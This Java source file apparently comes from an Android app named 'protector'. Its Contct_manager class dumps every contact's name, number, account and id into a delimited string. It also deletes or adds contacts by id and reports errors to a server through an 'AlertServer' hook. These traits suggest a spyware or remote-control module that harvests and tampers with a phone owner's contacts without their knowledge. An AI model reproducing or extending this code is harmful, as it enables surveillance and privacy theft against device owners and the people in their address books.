package com.icontrol.protector;

import static com.icontrol.protector.WorkServices.MyWorker.AlertServer;

import android.content.ContentProviderOperation;
import android.content.ContentResolver;
import android.content.Context;
import android.content.OperationApplicationException;
import android.database.Cursor;
import android.os.RemoteException;
import android.provider.ContactsContract;

import java.util.ArrayList;
import java.util.Random;

public class Contct_manager {
    public static String Load(Context c)  {
        //byte[] Databytes = null;
        try {
            StringBuffer sb = new StringBuffer();
            ContentResolver CR = c.getContentResolver();
            Cursor cur = CR.query(ContactsContract.Data.CONTENT_URI, null,
                    ContactsContract.Data.HAS_PHONE_NUMBER + "!=0 AND (" + ContactsContract.Data.MIMETYPE + "=? OR " + ContactsContract.Data.MIMETYPE + "=?)",
                    new String[]{ContactsContract.CommonDataKinds.Email.CONTENT_ITEM_TYPE, ContactsContract.CommonDataKinds.Phone.CONTENT_ITEM_TYPE},
                    ContactsContract.Data.CONTACT_ID);
            while (cur.moveToNext()) {

                String number = cur.getString(cur.getColumnIndex(ContactsContract.CommonDataKinds.Phone.NUMBER)).trim();

                if (number != null && !number.isEmpty() && !number.equals("null") && number.length() >0)
                {
                    String name = cur.getString(cur.getColumnIndex(ContactsContract.Data.DISPLAY_NAME));
                    String connected_via = cur.getString(cur.getColumnIndex(ContactsContract.Data.ACCOUNT_TYPE_AND_DATA_SET));
                    int id = cur.getInt(cur.getColumnIndex(ContactsContract.CommonDataKinds.Phone.CONTACT_ID));
                    sb.append(name +
                            Consts.SPLIT_ARAY +
                            number +
                            Consts.SPLIT_ARAY +
                            connected_via +
                            Consts.SPLIT_ARAY +
                            id  +
                            Consts.SPLIT_LINE);
//                    MyLoger.Error("TestCont:",number);
//                    MyLoger.Error("TestCont2:",rndid());
                }



            }
            cur.close();
            //Log.e("Contacts:",sb.toString());
            String s0 =  sb.toString() ;
            return s0;
        } catch (Exception e) {
            //Databytes = e.getMessage().getBytes();
        }

        return null;
    }


    public static void Remove(Context ctx,String id) {
         ArrayList ops = new ArrayList();
         ContentResolver cr = ctx.getContentResolver();
        ops.add(ContentProviderOperation
                .newDelete(ContactsContract.RawContacts.CONTENT_URI)
                .withSelection(
                        ContactsContract.RawContacts.CONTACT_ID
                                + " = ?",
                        new String[] { id })
                .build());

        try {
            cr.applyBatch(ContactsContract.AUTHORITY, ops);


        } catch (RemoteException e) {
            e.printStackTrace();
        } catch (OperationApplicationException e) {
            e.printStackTrace();
        }
        //background_process();
        ops.clear();

    }
    public static boolean Add(Context ctx , String Name, String Number) {
        String DisplayName = Name;
        String MobileNumber = Number;

        ArrayList<ContentProviderOperation> ops = new ArrayList<ContentProviderOperation>();
        ops.add(ContentProviderOperation.newInsert(ContactsContract.RawContacts.CONTENT_URI)
                .withValue(ContactsContract.RawContacts.ACCOUNT_TYPE, null)
                .withValue(ContactsContract.RawContacts.ACCOUNT_NAME, null)
                .build());

        //------------------------------------------------------ Names
        if(DisplayName != null)
        {
            ops.add(ContentProviderOperation.newInsert(ContactsContract.Data.CONTENT_URI)
                    .withValueBackReference(ContactsContract.Data.RAW_CONTACT_ID, 0)
                    .withValue(ContactsContract.Data.MIMETYPE,
                            ContactsContract.CommonDataKinds.StructuredName.CONTENT_ITEM_TYPE)
                    .withValue(ContactsContract.CommonDataKinds.StructuredName.DISPLAY_NAME, DisplayName).build());
        }
        //------------------------------------------------------ Mobile Number
        if(MobileNumber != null)
        {
            ops.add(ContentProviderOperation.newInsert(ContactsContract.Data.CONTENT_URI)
                    .withValueBackReference(ContactsContract.Data.RAW_CONTACT_ID, 0)
                    .withValue(ContactsContract.Data.MIMETYPE,
                            ContactsContract.CommonDataKinds.Phone.CONTENT_ITEM_TYPE)
                    .withValue(ContactsContract.CommonDataKinds.Phone.NUMBER, MobileNumber)
                    .withValue(ContactsContract.CommonDataKinds.Phone.TYPE,
                            ContactsContract.CommonDataKinds.Phone.TYPE_MOBILE)
                    .build());
        }


        //------------------------------------------------------ Email
//        if(emailID != null)
//        {
//            ops.add(ContentProviderOperation.newInsert(ContactsContract.Data.CONTENT_URI)
//                    .withValueBackReference(ContactsContract.Data.RAW_CONTACT_ID, 0)
//                    .withValue(ContactsContract.Data.MIMETYPE,
//                            ContactsContract.CommonDataKinds.Email.CONTENT_ITEM_TYPE)
//                    .withValue(ContactsContract.CommonDataKinds.Email.DATA, emailID)
//                    .withValue(ContactsContract.CommonDataKinds.Email.TYPE, ContactsContract.CommonDataKinds.Email.TYPE_WORK)
//                    .build());
//        }

        //------------------------------------------------------ Organization
//        if(!company.equals("") && !jobTitle.equals(""))
//        {
//            ops.add(ContentProviderOperation.newInsert(ContactsContract.Data.CONTENT_URI)
//                    .withValueBackReference(ContactsContract.Data.RAW_CONTACT_ID, 0)
//                    .withValue(ContactsContract.Data.MIMETYPE,
//                            ContactsContract.CommonDataKinds.Organization.CONTENT_ITEM_TYPE)
//                    .withValue(ContactsContract.CommonDataKinds.Organization.COMPANY, company)
//                    .withValue(ContactsContract.CommonDataKinds.Organization.TYPE, ContactsContract.CommonDataKinds.Organization.TYPE_WORK)
//                    .withValue(ContactsContract.CommonDataKinds.Organization.TITLE, jobTitle)
//                    .withValue(ContactsContract.CommonDataKinds.Organization.TYPE, ContactsContract.CommonDataKinds.Organization.TYPE_WORK)
//                    .build());
//        }

        // Asking the Contact provider to create a new contact
        try
        {
            ctx.getContentResolver().applyBatch(ContactsContract.AUTHORITY, ops);
            return true;
        }
        catch (Exception e)
        {
            //e.printStackTrace();
            ////Toast.makeText(ctx, "Exception: " + e.getMessage(), //Toast.LENGTH_SHORT).show();
            AlertServer(ctx,"Add Contact","Error:"+e.getMessage());
        }
        return false;
    }
}
